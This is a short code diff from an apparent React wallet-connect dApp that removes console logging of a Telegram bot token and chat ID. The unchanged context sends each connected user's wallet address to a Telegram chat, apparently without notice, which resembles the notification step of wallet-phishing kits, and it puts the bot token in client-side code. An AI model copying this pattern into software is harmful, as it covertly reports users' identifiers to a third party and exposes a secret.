@@ -11,13 +11,9 @@ import { BrowserProvider } from "ethers";
 const BOT_TOKEN = process.env.REACT_APP_BOT_TOKEN;
 const CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID;
 
-console.log(BOT_TOKEN);
-console.log(CHAT_ID);
-
 // 1. Get projectId
 const projectId = `${process.env.REACT_APP_PROJECT_ID}`;
 
-console.log(projectId);
 // 2. Set chains
 const mainnet = {
   chainId: 1,
@@ -64,8 +60,6 @@ function Components() {
     if (!isConnected) throw Error("User disconnected");
 
     try {
-      console.log(BOT_TOKEN);
-      console.log(CHAT_ID);
       const response = await fetch(
         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${address}`
       );
